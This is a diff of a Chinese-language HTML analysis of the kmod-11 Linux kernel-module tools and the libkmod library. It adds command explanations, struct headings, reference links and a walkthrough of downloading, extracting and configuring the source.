@@ -4,13 +4,19 @@
 <p>这些工具在底层都需要用到 libkmod 这个库，相关的源码也会跟着 kmod 项目一同发布。这个项目的目标是能够实现与在此之前 module-init-tools 项目所提供的工具兼容。</p>
 <h3 id="建立时间">建立时间</h3>
 <p>从 git.kernel.org 上的 commit log 分析，该项目的建立时间是 2011-11-21。最初的项目是通过继承了 libabc 的框架开始逐步演变而来。2011-12-15 发布了 kmod 1 版本。</p>
-<p>参考<em>项目主页</em><br /><a href="http://git.kernel.org/cgit/utils/kernel/kmod/kmod.git"><code class="url">http://git.kernel.org/cgit/utils/kernel/kmod/kmod.git</code></a></p>
+<ul>
+<li><p>参考项目主页<br /><a href="http://git.kernel.org/cgit/utils/kernel/kmod/kmod.git"><code class="url">http://git.kernel.org/cgit/utils/kernel/kmod/kmod.git</code></a></p></li>
+</ul>
 <h3 id="创建者和维护者">创建者和维护者</h3>
 <p>创建者是 Lucas De Marchi。这个人就职于巴西 Brazil Campinas 的一家公司ProFUSION Embedded Systems（该公司的主页http://profusion.mobi/），从他在 github 个人项目的帐号创建时间看是 2008年10月30号，应该是属于比较早期的 github 用户。</p>
-<p>参考<em>个人主页</em><br /><a href="https://github.com/lucasdemarchi"><code class="url">https://github.com/lucasdemarchi</code></a></p>
+<ul>
+<li><p>参考个人主页<br /><a href="https://github.com/lucasdemarchi"><code class="url">https://github.com/lucasdemarchi</code></a></p></li>
+</ul>
 <h3 id="更新记录">更新记录</h3>
 <p>项目最近一次提交 commit log 表明，该项目近期处于一个比较活跃的状态。从 2013-4-9 发布了最新的 kmod 13 版本之后，该项目几乎每隔1，2天有一次或多次提交。最近的一次提交是 2013-4-17，主要的贡献者仍然是 Lucas De Marchi。</p>
-<p>参考<em>提交记录</em><br /><a href="http://git.kernel.org/cgit/utils/kernel/kmod/kmod.git/log/"><code class="url">http://git.kernel.org/cgit/utils/kernel/kmod/kmod.git/log/</code></a></p>
+<ul>
+<li><p>参考提交记录<br /><a href="http://git.kernel.org/cgit/utils/kernel/kmod/kmod.git/log/"><code class="url">http://git.kernel.org/cgit/utils/kernel/kmod/kmod.git/log/</code></a></p></li>
+</ul>
 <h3 id="版本情况">版本情况</h3>
 <p>第一个可以下载的软件包 kmod-1.tar.gz 是2012-2-24 上传的，最新的软件包 kmod-13.tar.gz 是 2013-4-9 上传的。</p>
 <p>目前 kmod 已经发布到了第13个版本，从项目 NEWS 中可以看到，项目从版本 1 就开始支持原来的 insmod/rmmod/lsmod/modprobe 这几个常用命令，发展至今libkmod 库已经提供了100多个函数接口用于方便用户管理内核模块。</p>
@@ -36,6 +42,7 @@ document.write('<a h'+'ref'+'="ma'+'ilto'+':'+e+'">'+'<code>'+e+'</code>'+'<\/'+
 <p>[htbp] <img src="./figures/1-app.jpg" alt="image" /> kmod-11 项目应用层结构图</p>
 <h4 id="insmod-命令">insmod 命令</h4>
 <p>该命令的功能是: 向Linux内核中插入一个模块</p>
+<p>插入模块时，如果当前模块依赖于其他模块提供的变量或者函数，同时这些被依赖的模块还未添加进入内核，则插入操作就不能成功。只有预先把这些被依赖的模块插入内核后，这个命令才能成功。所以通常我们在插入模块时，更多会使用 modprobe 命令来插入。</p>
 <pre><code>$ ./kmod-11/tools/insmod -h
 
 Usage:
@@ -45,6 +52,7 @@ Options:
     -h, --help        show this help</code></pre>
 <h4 id="rmmod-命令">rmmod 命令</h4>
 <p>该命令的功能是: 删除内核中的模块</p>
+<p>删除模块时，如果当前模块还正在被别的模块所使用（依赖），则删除模块操作就不能成功。只有在当前模块的引用计数为0的时候，才能够被真正得从内核中删除掉。</p>
 <pre><code>$ ./kmod-11/tools/rmmod -h
 Usage:
     rmmod [options] modulename ...
@@ -58,10 +66,12 @@ Options:
     -h, --help        show this help</code></pre>
 <h4 id="lsmod-命令">lsmod 命令</h4>
 <p>该命令的功能是: 列出内核已载入模块的状态</p>
+<p>通过分析 /proc/modules 文件，列出已经加载的模块名称。</p>
 <pre><code>$ ./kmod-11/tools/lsmod -h
 Usage: ./kmod-11/tools/lsmod</code></pre>
 <h4 id="modinfo-命令">modinfo 命令</h4>
 <p>该命令的功能是: 显示内核模块的信息</p>
+<p>通过分析内核模块文件的 ELF 格式，得出该内核模块的相关信息，例如作者，版本，协议等。</p>
 <pre><code>$ ./kmod-11/tools/modinfo -h
 Usage:
     modinfo [options] filename [args]
@@ -110,12 +120,11 @@ The following options are useful for people managing distributions:
                      symbol versions.
 $ </code></pre>
 <h4 id="modprobe-命令">modprobe 命令</h4>
-<p>该命令的功能是: Linux内核添加或者删除模块。modprobe会从linux内核中智能地添加或者移除模块。 和 insmod 命令所不同的是，modprobe 在挂载模块是不用指定模块文件的路径，也不用带文件的后缀.o 或.ko； 而 insmod 需要的是模块的所在目录的绝对路径，并且一定要带有模块文件名后缀的。</p>
-<p>通过我们只是用 insmod 来验证一下文件的正确性，真正要插入模块的时候，通常还是推荐使用 modprobe。</p>
+<p>该命令的功能是: 可以完成向内核中自动添加或者删除(通过-r参数）当前模块和模块所依赖的模块，并且支持 alias 别名方式。</p>
+<p>和 insmod 命令所不同的是，modprobe 在挂载模块是不用指定模块文件的路径，也不用带文件的后缀.o 或.ko； 而 insmod 需要的是模块的所在目录的绝对路径，并且一定要带有模块文件名后缀的。 modprobe 会从 linux内核中根据模块的依赖关系，智能地添加或者移除模块。 通过我们只是用 insmod 来验证一下文件的正确性，真正要插入模块的时候，通常还是推荐使用 modprobe。</p>
 <p>为了方便，在module名称中的_和-是一样的，同时模块名称中不能出现小数点，这个工作叫 normalize 正规化。</p>
 <p>modprobe在模块目录/lib/modules/<code>uname -r</code>中查找除了 /etc/modprobe.conf配置文件和/etc/modprobe.d目录之外中的模块和其他文件。</p>
-<p>modprobe需要一个实时更新的modules.dep文件，这个文件由depmod生成。这个文件列出了每个模块还需要依赖哪些其他的模块。</p>
-<p>modprobe利用这个文件来自动解决添加和删除模块时候的依赖关系。</p>
+<p>modprobe需要一个实时更新的modules.dep文件，这个文件由depmod生成。这个文件列出了每个模块还需要依赖哪些其他的模块。modprobe利用这个文件来自动解决添加和删除模块时候的依赖关系。</p>
 <pre><code>$ ./kmod-11/tools/modprobe -h
 Usage:
     modprobe [options] [-i] [-b] modulename
@@ -161,14 +170,21 @@ General Options:
     -h, --help                  show this help
 $ </code></pre>
 <p>模块加载时，会用到配置信息 configuration, 使用 modprobe -c 命令可以查看这些配置信息，包括如下参数 如果用户指定了 -f 参数，则要求强制加载，那么加载程序所需要处理的就是将 .modinfo 字段去掉，然后再交给内核去加载。</p>
-<ul>
-<li><p>alias 别名 例如</p>
-<p>$ cat /etc/modprobe.d/myalias.conf alias mymod really_long_module_name</p></li>
-<li><p>blacklist 黑名单 例如</p>
-<p>$ cat /etc/modprobe.d/blacklist blacklist ieee1394 blacklist ohci1394 blacklist eth1394 blacklist sbp2</p></li>
-<li><p>install 和 remove 命令 例如</p>
-<p>$ cat /etc/modprobe.d/ieee1394 install ieee1394 /bin/true install ohci1394 /bin/true install eth1394 /bin/true install sbp2 /bin/true</p></li>
-</ul>
+<p><strong>alias 别名</strong><br />例如</p>
+<pre><code>$ cat /etc/modprobe.d/myalias.conf
+alias mymod really_long_module_name</code></pre>
+<p><strong>blacklist 黑名单</strong><br />例如</p>
+<pre><code>$ cat /etc/modprobe.d/blacklist
+blacklist ieee1394
+blacklist ohci1394
+blacklist eth1394
+blacklist sbp2</code></pre>
+<p><strong>install 和 remove 命令</strong><br />例如</p>
+<pre><code>$ cat /etc/modprobe.d/ieee1394
+install ieee1394 /bin/true
+install ohci1394 /bin/true
+install eth1394 /bin/true
+install sbp2 /bin/true</code></pre>
 <h3 id="库接口层">库接口层</h3>
 <p>库接口层包含了 libkmod 目录下的形如 libkmod-xxx.c 的模块文件，其中涉及用到的编程接口将近100个，形如 kmod_xxx_xxx_xxx 的接口函数。</p>
 <p>按照这些接口函数的归属模块划分，我们经过代码分析，可以将它们分为6个重要的核心子模块，分别是 kmod_ctx, kmod_module, kmod_config, kmod_list, kmod_elf, kmod_file。</p>
@@ -183,7 +199,7 @@ $ </code></pre>
 <h3 id="各层之间相互关系图">各层之间相互关系图</h3>
 <p>以上的命令，库，核心子模块，基础子模块以及系统调用模拟层，之间的关系并不是明显分开的，而是互相之间有交错的关系。为了更清楚的说明整个系统各个层次之间的调用关系，我们以下图为例，做简要说明。</p>
 <p>[htbp] <img src="./figures/sys.jpg" alt="image" /> kmod-11 项目系统各层结构关系图</p>
-<p>其中命令层就是应用层，一般命令的实现都会首先使用 kmod_ctx 和 kmod_module 两个核心子模块的接口，其中 kmod_ctx 调用了 kmod_config 核心子模块和 hash, log, index_mm 基础子模块的接口功能，kmod_module 调用了 kmod_file, kmod_elf, kmod_list 这3个核心子模块的接口功能，以及简介调用了 elf, list 这2个基础子模块的接口功能，同时还使用了模拟层中有关系统调用模拟实现的接口。</p>
+<p>其中命令层就是应用层，一般命令的实现都会首先使用 kmod_ctx 和 kmod_module 两个核心子模块的接口，其中 kmod_ctx 调用了 kmod_config 核心子模块和 hash, log, index_mm 基础子模块的接口功能，kmod_module 调用了 kmod_file, kmod_elf, kmod_list 这3个核心子模块的接口功能，以及调用了 elf, list 这2个基础子模块的接口功能，同时还使用了模拟层中有关系统调用模拟实现的接口。</p>
 <p>因此在我们所列出的6个核心子模块中，kmod_ctx 和 kmod_module 这2个核心子模块占据着更为重要的作用，是整个 libkmod 库的核心中的核心。在下面的分析中，我们还会详细论述它们的功能。</p>
 <h1 id="kmod-11-项目概要分析">Kmod-11 项目概要分析</h1>
 <h2 id="工具安装使用流程">工具安装使用流程</h2>
@@ -216,7 +232,7 @@ $ ./configure CFLAGS=&quot;-g -O2&quot; --prefix=/usr --sysconfdir=/etc --libdir
 $ make &amp;&amp; make install</code></pre>
 <h3 id="错误及解决">错误及解决</h3>
 <p>代码编译过程会出现不少问题，但都可以通过安装和配置逐一解决。现对编译过程中的问题做一总结：</p>
-<p><strong>1）autoconf 缺少环境变量文件</strong></p>
+<h4 id="autoconf-缺少环境变量文件">autoconf 缺少环境变量文件</h4>
 <pre><code>$ autoconf 
 configure.ac:10: error: possibly undefined macro: AM_INIT_AUTOMAKE
       If this token and others are legitimate, please use m4_pattern_allow.
@@ -225,7 +241,7 @@ configure.ac:28: error: possibly undefined macro: AM_PROG_CC_C_O
 configure.ac:89: error: possibly undefined macro: AM_CONDITIONAL
 $ aclocal</code></pre>
 <p>通过 aclocal 命令生成，获取当前系统的环境变量，生成一个 aclocal.m4 文件。</p>
-<p><strong>2）configure 脚本执行时缺少 libtool 工具</strong></p>
+<h4 id="configure-脚本执行时缺少-libtool-工具">configure 脚本执行时缺少 libtool 工具</h4>
 <pre><code>$ ./configure CFLAGS=&quot;-g -O2&quot; --prefix=/usr --sysconfdir=/etc --libdir=/usr/lib
 configure: error: cannot find install-sh, install.sh, or shtool in build-aux &quot;.&quot;/build-aux
 $ autoreconf -f -i -Wall,no-obsolete
@@ -233,7 +249,7 @@ Can&#39;t exec &quot;libtoolize&quot;: No such file or directory at /usr/bin/aut
 Use of uninitialized value in pattern match (m//) at /usr/bin/autoreconf line 196.
 $ sudo apt-get install libtool</code></pre>
 <p>通过 sudo apt-get 安装解决。</p>
-<p><strong>3）configuire 脚本执行缺少 xsltproc 命令</strong></p>
+<h4 id="configuire-脚本执行缺少-xsltproc-命令">configuire 脚本执行缺少 xsltproc 命令</h4>
 <pre><code>$ ./configure CFLAGS=&quot;-g -O2&quot; --prefix=/usr --sysconfdir=/etc --libdir=/usr/lib
 configure: error: xsltproc command not found, try ./configure --disable-manpages
 $ sudo apt-get install xsltproc </code></pre>
@@ -1031,9 +1047,8 @@ struct kmod_module {
 <h3 id="kmod_ctx-库上下文">kmod_ctx 库上下文</h3>
 <p>该模块的主要功能，是为 kmod module 提供一个执行环境，也就是通常所说的上下文 context 的概念。数据结构的设计，用了 ctx 来表示这个上下文的英文缩写。</p>
 <p>该模块主要的实现代码都在 libkmod/libkmod.c，比较常用的数据结构和接口有</p>
-<pre><code>struct kmod_ctx;
-
-struct kmod_ctx {
+<h4 id="struct-kmod_ctx-结构体定义">struct kmod_ctx 结构体定义</h4>
+<pre><code>struct kmod_ctx {
     int refcount;
     int log_priority;
     void (*log_fn)(void *data,
@@ -1064,9 +1079,8 @@ void kmod_unload_resources(struct kmod_ctx *ctx);</code></pre>
 <h3 id="kmod_module-内核模块核心操作">kmod_module 内核模块核心操作</h3>
 <p>kmod_module 是所有模块中最重要和最核心的模块。该模块的主要功能是抽象了一个对所有内核模块进行操作的对象，它是真正可以代表一个具体的已经被加载到内核，或者即将被加载到内核的模块对象。其中，除了包含刚才所说的 kmod_ctx 上下文的模块，作为该模块运行时环境的一个引用之外，还包含有其他两个重要的数据结构 struct kmod_list *dep 和 struct kmod_file *file，其中 dep 代表着已经被加载到内核中的这个模块所需要的依赖关系，也就是为了要加载这个模块，需要用到的需要提前加载的其他模块列表，这样的模块可能有很多，所以采用了一个链表的方式来记录。file 代表着当前这个被加载模块，在磁盘上所对应的文件。这个结构体在下面还会详细解释，其中最重要的信息包括文件的大小，文件的内容在内存中的指针，以及该文件对应的 ELF 格式的文件内容。</p>
 <p>该模块主要的实现代码都在 libkmod/libkmod-module.c，比较常用的数据结构和接口有</p>
-<pre><code>struct kmod_module;
-
-struct kmod_module {
+<h4 id="struct-kmod_module-结构体定义">struct kmod_module 结构体定义</h4>
+<pre><code>struct kmod_module {
         struct kmod_ctx *ctx;
         char *hashkey;
         char *name;
@@ -1132,9 +1146,8 @@ void kmod_module_info_free_list(struct kmod_list *list);</code></pre>
 <h3 id="kmod_file-内核模块文件操作">kmod_file 内核模块文件操作</h3>
 <p>该模块是隶属于 kmod_module 模块的一个成员变量，用来支持 kmod_module 模块的实现。每一个需要加载的模块，都对应于磁盘上的一个文件，要插入一个模块，首先需要从磁盘上把这个文件读出来读到内存中，并且获得文件的大小和指向文件内容的内存指针，用这些数据再构建出一个 ELF 文件的 section 信息，并获得其中有关用模块的 modinfo 内容。</p>
 <p>该模块主要的实现代码都在 libkmod/libkmod-file.c，比较常用的数据结构和接口有</p>
-<pre><code>struct kmod_file;
-
-struct kmod_file {
+<h4 id="struct-kmod_file-结构体定义">struct kmod_file 结构体定义</h4>
+<pre><code>struct kmod_file {
 #ifdef ENABLE_XZ
     bool xz_used;
 #endif
@@ -1156,9 +1169,8 @@ void kmod_file_unref(struct kmod_file *file)</code></pre>
 <h3 id="kmod_elf-内核模块elf文件操作">kmod_elf 内核模块elf文件操作</h3>
 <p>该模块是隶属于 kmod_file 模块的一个成员变量，用来支持 kmod_file 模块的实现。从层次结构上来说，它是高于 kmod_file 的，因为这个模块的创建，需要依赖于 kmod_file 模块提供的 get_contents 和 get_size 接口所获得的返回值。但是从数据结构的隶属关系上，它是属于 kmod_file 内部的一个成员。</p>
 <p>该模块主要的实现代码都在 libkmod/libkmod-elf.c ，这个模块所围绕的数据结构是 kmod_elf，其中所包含的最重要的成员是 memory 和 size, 在 kmod_module_insert_module 函数接口中，需要用到这2个数据来创建一个 kmod_elf 变量，因此 kmod_elf_new 函数的2个参数也就是用的这2个变量。</p>
-<pre><code>struct kmod_elf;
-
-struct kmod_elf {
+<h4 id="struct-kmod_elf-结构体定义">struct kmod_elf 结构体定义</h4>
+<pre><code>struct kmod_elf {
     const uint8_t *memory;
     uint8_t *changed;
     uint64_t size;
@@ -1186,6 +1198,7 @@ void kmod_elf_unref(struct kmod_elf *elf)</code></pre>
 <h3 id="kmod_list-内核模块列表">kmod_list 内核模块列表</h3>
 <p>该模块是隶属于 kmod_module 模块的一个成员变量，用来支持 kmod_module 模块的实现。每一个被加载的模块，有的是不依赖于任何其他模块就可以被加载，但也有很多是需要依赖于其他模块被加载后，才能被加载。kmod_list 为这些模块提供了一个索引，通过这个 list 可以获得所有和当前被加载模块有依赖关系的模块列表，然后在这个列表中，这些需要提前被加载的模块也按照依赖关系排好顺序，加载的时候只需要遍历链表，依次加载每个模块，最后再加载当前模块就可以了。这个功能的实现可以参考 modprobe 命令实现流程分析。这个模块在 kmod_module，kmod_config 中都有用到。</p>
 <p>该模块主要的实现代码都在 libkmod/libkmod-list.c，其中结构体的定义在 kmod-11/libkmod/libkmod-private.h 中。</p>
+<h4 id="struct-kmod_list-结构体定义">struct kmod_list 结构体定义</h4>
 <pre><code>struct kmod_list {
     struct list_node node;
     void *data;
@@ -1208,11 +1221,10 @@ struct kmod_list *kmod_list_append_list(struct kmod_list *list1, struct kmod_lis
             list_entry = (list_entry-&gt;node.next == &amp;((first_entry)-&gt;node)) ? NULL : \
             container_of(list_entry-&gt;node.next, struct kmod_list, node))</code></pre>
 <h3 id="kmod_config-内核模块配置">kmod_config 内核模块配置</h3>
-<p>该模块是隶属于 kmod_ctx 模块的一个成员变量，用来支持 kmod_ctx 模块的实现。在 kmod_new 函数的实现中，需要传递一个 config_paths 字符串变量，这个变量将作为 kmod_config_new 的参数，创建出一个 kmod_config 变量，用来填充 kmod_ctx 数据结构中的 *config，表示配置文件所在的路径。如果默认是NULL，则会到以下3个路径中去寻找 /run/modprobe.d/，/lib/modprobe.d/，/etc/modprobe.d/ ， 否则，则会将 config_paths 作为一个指针数组的基地址，用 config_paths[i] 来遍历整个指针数组，获得每一个路径 char * path = config_paths[i]，然后用 path 来创建 conf_files_list 。</p>
+<p>该模块是隶属于 kmod_ctx 模块的一个成员变量，用来支持 kmod_ctx 模块的实现。在 kmod_new 函数的实现中，需要传递一个 config_paths 字符串变量，这个变量将作为 kmod_config_new 的参数，创建出一个 kmod_config 变量，用来填充 kmod_ctx 数据结构中的 *config，表示配置文件所在的路径。如果默认是NULL，则会到以下3个路径中去寻找 /run/modprobe.d/ ，/lib/modprobe.d/ ，/etc/modprobe.d/ ， 否则，则会将 config_paths 作为一个指针数组的基地址，用 config_paths[i] 来遍历整个指针数组，获得每一个路径 char * path = config_paths[i]，然后用 path 来创建 conf_files_list 。</p>
 <p>该模块主要的实现代码在 libkmod/libkmod-config.c, 其中结构体的定义在 kmod-11/libkmod/libkmod-private.h 中。</p>
-<pre><code>struct kmod_config;
-
-struct kmod_config {
+<h4 id="struct-kmod_config-结构体定义">struct kmod_config 结构体定义</h4>
+<pre><code>struct kmod_config {
     struct kmod_ctx *ctx;
     struct kmod_list *aliases;
     struct kmod_list *blacklists;
@@ -1229,9 +1241,8 @@ void kmod_config_free(struct kmod_config *config)</code></pre>
 <h3 id="hash-哈希表模块">hash 哈希表模块</h3>
 <p>该模块是隶属于 kmod_ctx 模块的一个成员变量，用来支持 kmod_ctx 模块的实现。</p>
 <p>该模块主要的实现代码都在 libkmod/libkmod-hash.c。</p>
-<pre><code>struct hash;
-
-struct hash {
+<h4 id="struct-hash-结构体定义">struct hash 结构体定义</h4>
+<pre><code>struct hash {
     unsigned int count;
     unsigned int step;
     unsigned int n_buckets;
@@ -1252,9 +1263,8 @@ bool hash_iter_next(struct hash_iter *iter, const char **key,
 <h3 id="index_mm-索引查找模块">index_mm 索引查找模块</h3>
 <p>该模块是隶属于 kmod_ctx 模块的一个成员变量，用来支持 kmod_ctx 模块的实现。</p>
 <p>该模块主要的实现代码都在 libkmod/libkmod-index.c</p>
-<pre><code>struct index_mm;
-
-struct index_mm {
+<h4 id="struct-index_mm-结构体定义">struct index_mm 结构体定义</h4>
+<pre><code>struct index_mm {
     struct kmod_ctx *ctx;
     void *mm;
     uint32_t root_offset;
@@ -1278,6 +1288,7 @@ struct index_value *index_mm_searchwild(struct index_mm *idx, const char *key);
 void index_mm_dump(struct index_mm *idx, int fd, const char *prefix);</code></pre>
 <h3 id="elf-文件分析模块">elf 文件分析模块</h3>
 <p>该模块是一个在 kmod_elf 内部实现的一系列接口的统称，本身并没有一个同名的数据结构，其中比较具有相关性的一个数据结构就是 kmod_elf_header。这个数据结构隶属于 kmod_elf，用来支持 kmod_elf 模块的实现。</p>
+<h4 id="struct-kmod_elf_header-结构体定义">struct kmod_elf_header 结构体定义</h4>
 <pre><code>struct kmod_elf_header {
         struct {
                 uint64_t offset;
@@ -1311,6 +1322,7 @@ static const char * elf_get_strings_section (const struct kmod_elf *elf, uint64_
 <h3 id="list-链表模块">list 链表模块</h3>
 <p>该模块是一个基础类的功能模块，它是一个抽象的数据结构 list 的实现。可以用来支持 kmod_list，等于是用 kmod_list 对 list 做了一层封装，也相当于是一个抽象层的概念，然后在这个项目中，更多的使用 kmod_list 来支持其他的数据结构。例如 kmod_config，kmod_module 中都是直接使用了 kmod_list 数据结构，而不是 list。</p>
 <p>其中结构体 struct link_node 的定义在 kmod-11/libkmod/libkmod-private.h 中。</p>
+<h4 id="struct-list_node-结构体定义">struct list_node 结构体定义</h4>
 <pre><code>struct list_node {
     struct list_node *next, *prev;
 };
@@ -1327,6 +1339,7 @@ static void list_node_append_list (struct list_node *list1, struct list_node *li
 <p>该模块的主要功能是实现一个动态数组，完成动态数组所需要的初始化init, 插入append，删除remove_at，排序sort 等几个重要的操作。在 depmod 命令的实现中，array 至关重要，正是通过构建了这个动态数组，完成了对这个数组的 sort 排序操作，才得以最终输出 modules.dep 文件，为 modprobe 命令做好了准备。</p>
 <p>通过 grep 命令 grep -rns “array_init” kmod-11/* 可以看出，在整个 kmod 项目中，只有 depmod 命令用到了 array 的支持，其他地方都没有用到。但这个模块是一个通用模块，值得我们学习和研究。</p>
 <p>该模块主要的实现代码都在 libkmod/libkmod-array.c, 其中结构体 struct array 的定义在 kmod-11/libkmod/libkmod-array.h 中。</p>
+<h4 id="struct-array-结构体定义">struct array 结构体定义</h4>
 <pre><code>struct array {
     void **array;
     size_t count;
@@ -1978,7 +1991,7 @@ static void cfg_free(struct cfg *cfg)
 2176                 { }
 2177         };</code></pre>
 <p>其中输出到 /lib/modules/3.2.0-29-generic-pae/modules.dep 文件的输出函数是 output_deps 通过修改如下 fprintf(out, …) 函数，增添输出到标准输出 stdout 的 fprintf(stdout, …) 则可以在屏幕上看到运行 depmod 命令时候的全部输出结果，这个结果和 modules.dep 文件中的内容是完全一样的。</p>
-<p>这里用的几个文件，含义和用法如下： * modules.alias : 模块别名定义. 模块加载工具使用它来加载相应的模块. * modules.dep : 定义了模块间的依赖关系. * modules.symbols : 指定符号属于哪个模块. *</p>
+<p>这里用的几个文件，含义和用法如下： * modules.alias : 模块别名定义. 模块加载工具使用它来加载相应的模块. * modules.dep : 定义了模块间的依赖关系. * modules.symbols : 指定符号属于哪个模块.</p>
 <pre><code>1790 static int output_deps(struct depmod *depmod, FILE *out)
 1791 {
 1792         size_t i;
@@ -2028,12 +2041,15 @@ static void cfg_free(struct cfg *cfg)
 
     //  根据传入的 argv[] 参数，依次卸载 nargs 个模块
     err = rmmod_all(ctx, args, nargs); 
-
     err = options_from_array(args, nargs, &amp;opts);
+
+    // 完成模块的 probe 方式插入操作，是一个内部的static函数
     err = insmod(ctx, args[0], opts);
 
+    // 释放 kmod 库上下文
     kmod_unref(ctx);
 
+    // 关闭日志文件，调用 closelog()
     log_close();
 }</code></pre>
 <p>[htbp] <img src="./figures/modprobe.jpg" alt="image" /> modprobe 调用层次图</p>
@@ -2077,6 +2093,7 @@ static void cfg_free(struct cfg *cfg)
     kmod_module_unref_list(list);
     return err;
 }</code></pre>
+<p>[htbp] <img src="./figures/modprobe-insmod.jpg" alt="image" /> modprobe 实现内部 insmod 调用层次图</p>
 <p>[htbp] <img src="./figures/insmod_all.jpg" alt="image" /> insmod_all 函数调用层次图</p>
 <p>从上面的代码分析可以看出，insmod 函数是依靠调用 kmod_module_probe_insert_module() 来完成模块加载的。 为什么这里的 insmod 没有调用之前分析过的 kmod_module_insert_module() 来实现呢？ 是因为 kmod_module_insert_module() 只负责插入当前这个 .ko 内核模块，并不负责检查依赖关系。 而这里的 insmod 是需要根据当前 .ko 的依赖关系列表，决定要把多少个 .ko 依次一起插入进来。 所以 kmod_module_probe_insert_module() 是可以完成根据依赖关系插入模块的 libkmod 中的重要接口。</p>
 <p>当然这两个函数之间也是有相互关系的，表现为 kmod_module_probe_insert_module() 函数会调用 kmod_module_insert_module()， 而在此之前，还需要通过 kmod_module_get_probe_list() 函数来得到一个 probe_list 也就是加载模块列表。</p>
@@ -2310,11 +2327,11 @@ static void cfg_free(struct cfg *cfg)
 <li><p>对加载的 ELF 映像进行分析，确定要加载哪些段进入到真正代码空间</p></li>
 <li><p>为要加载的每一个段进行重新定位，最终完成加载，插入到内核中，成为内核符号表的一部分，并创建相关的sysfs文件</p></li>
 </ul>
-<p>参考代码： 摘自 linux-x.x.xx/kernel/module.c</p>
+<p>参考代码： linux-x.x.xx/kernel/module.c</p>
 <p><a href="http://blog.csdn.net/ganggexiongqi/article/details/6823960"><code class="url">http://blog.csdn.net/ganggexiongqi/article/details/6823960</code></a></p>
 <p>[htbp] <img src="./figures/sys_init_module.jpg" alt="image" /> 内核模块在内核空间的加载流程</p>
 <p>在 kmod-11 项目中，在 testsuite/ 目录下有一个 init_module.c ，里面也实现了一个 init_module 的函数， 它的功能主要是在用户空间模拟内核加载，来进行调试和分析，并不是真正的加载模块。</p>
-<p>从下面的代码分析可以看出，这个“假的” init_module 实际上是通过 create_sysfs_files 创建系统文件来表明模块已经完成插入工作。</p>
+<p>从下面的代码分析可以看出，这个“假的”init_module 实际上是通过 create_sysfs_files 创建系统文件来表明模块已经完成插入工作。</p>
 <pre><code>long init_module(void *mem, unsigned long len, const char *args)
 {
     kmod_elf *elf = kmod_elf_new(mem, len);
@@ -2351,10 +2368,12 @@ static void cfg_free(struct cfg *cfg)
     return mod-&gt;ret;
 }</code></pre>
 <ul>
-<li><p>参考文档</p></li>
+<li><p>参考文档</p>
+<ul>
+<li><p><a href="https://www.ibm.com/developerworks/cn/linux/l-lkm/"><code class="url">https://www.ibm.com/developerworks/cn/linux/l-lkm/</code></a></p></li>
+<li><p><a href="http://hi.baidu.com/youngky2008/item/8e6a51fe76b45551c9f337a9"><code class="url">http://hi.baidu.com/youngky2008/item/8e6a51fe76b45551c9f337a9</code></a></p></li>
+</ul></li>
 </ul>
-<p><a href="https://www.ibm.com/developerworks/cn/linux/l-lkm/"><code class="url">https://www.ibm.com/developerworks/cn/linux/l-lkm/</code></a></p>
-<p><a href="http://hi.baidu.com/youngky2008/item/8e6a51fe76b45551c9f337a9"><code class="url">http://hi.baidu.com/youngky2008/item/8e6a51fe76b45551c9f337a9</code></a></p>
 <h3 id="kmod_module_unref-核心代码分析">kmod_module_unref() 核心代码分析</h3>
 <p>该函数是 kmod_module_new 操作的反操作，主要功能是释放 new 函数中分配的内存空间。 通过调用 kmod_pool_del_module 在 kmod_pool 池中删除该模块的hash键值。 同时减少对该模块的引用计数 –mod-&gt;refcount; 如果减1后计数为0，则需要彻底将该模块从内核中清除。</p>
 <p>首先，把它从 kmod_pool 中删除 kmod_pool_del_module(mod-&gt;ctx, mod, mod-&gt;hashkey); 对于该模块所依赖的模块列表中的所有模块的引用计数也需要进行减1操作 kmod_module_unref_list(mod-&gt;dep)。 释放该模块对应的 kmod_file 也就是 kmod_file_unref(mod-&gt;file); 释放该模块对应的 kmod_ctx 也就是 kmod_unref(mod-&gt;ctx);</p>
@@ -2649,13 +2668,544 @@ int main(int argc, char *argv[])
 <p>这几个模块并非是 kmod 项目所独有的，完全可以作为未来开发项目的基础类库得以复用。</p>
 <h3 id="系统调用模拟层的设计理念">系统调用模拟层的设计理念</h3>
 <p>因为内核模块会经常需要和内核打交道，无论插入和删除，一不小心可能会造成内核崩溃，只能靠 reset 重启来进行调试。因此引入关于系统调用函数的应用层实现，就可以在用户空间模拟系统调用后发生的行为，进行调试和验证。</p>
+<p>系统调用模拟层的实现，需要依靠链接器来完成，也就是当 init_module 这个系统调用和 init_module.c 中的函数进行链接的时候，就通过调用函数实现。如果没有和 init_module.c 相链接，则通过链接 glibc 的系统调用来实现。</p>
+<p>我们可以用下面这张图来表明这种模型的架构。</p>
+<p>[htbp] <img src="./figures/sys_sim.jpg" alt="image" /> 系统调用模拟层设计架构图</p>
+<h1 id="kmod-11-项目运行时调试图">Kmod-11 项目运行时调试图</h1>
+<h2 id="编译安装运行调试图">编译安装运行调试图</h2>
+<h3 id="wget下载源码包">wget下载源码包</h3>
+<pre><code>$ wget https://www.kernel.org/pub/linux/utils/kernel/kmod/kmod-11.tar.gz
+--2013-06-18 01:08:47--  https://www.kernel.org/pub/linux/utils/kernel/kmod/kmod-11.tar.gz
+Resolving www.kernel.org (www.kernel.org)... 149.20.4.69, 198.145.20.140
+Connecting to www.kernel.org (www.kernel.org)|149.20.4.69|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3458574 (3.3M) [application/x-gzip]
+Saving to: `kmod-11.tar.gz&#39;
+
+100%[======================================&gt;] 3,458,574    795K/s   in 5.3s    
+
+2013-06-18 01:08:54 (641 KB/s) - `kmod-11.tar.gz&#39; saved [3458574/3458574]</code></pre>
+<p>[htbp] <img src="./pictures/1-1-wget.png" alt="image" /> wget下载源码包</p>
+<h3 id="tar解压源码包">tar解压源码包</h3>
+<pre><code>$ tar zxf kmod-11.tar.gz 
+$ cd kmod-11
+$ ls
+aclocal.m4   configure     libkmod      Makefile.in  README     tools
+build-aux    configure.ac  m4           man          testsuite
+config.h.in  COPYING       Makefile.am  NEWS         TODO
+$ </code></pre>
+<p>[htbp] <img src="./pictures/1-2-tar.png" alt="image" /> tar解压源码包</p>
+<h3 id="configure-配置项目源码">configure 配置项目源码</h3>
+<pre><code>$ ./configure CFLAGS=&quot;-g -O2&quot; --prefix=/usr --sysconfdir=/etc --libdir=/usr/lib
+checking for a BSD-compatible install... /usr/bin/install -c
+checking whether build environment is sane... yes
+checking for a thread-safe mkdir -p... /bin/mkdir -p
+checking for gawk... no
+checking for mawk... mawk
+checking whether make sets $(MAKE)... yes
